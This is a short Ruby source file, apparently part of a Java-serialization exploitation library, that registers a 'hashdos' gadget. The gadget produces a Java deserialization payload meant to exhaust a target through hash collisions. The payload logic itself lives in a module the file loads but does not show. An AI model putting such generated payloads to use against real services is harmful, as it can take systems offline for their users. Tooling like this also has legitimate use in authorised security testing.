# -*- coding: binary -*-
require_relative '../../payloads/dos'

S=Rex::Java::Serialization 
class HashDOS < S::Generator::Gadget
  def id
    'hashdos'
  end

  def usable(_ctx, params: {})
    true
  end

  def auto?
    false
  end

  def create(_ctx, params: {})
    S::Payloads::DOS.make_hash_dos(params.fetch('dosDepth', 30))
  end
end

S::Generator.register(
  HashDOS.new
)
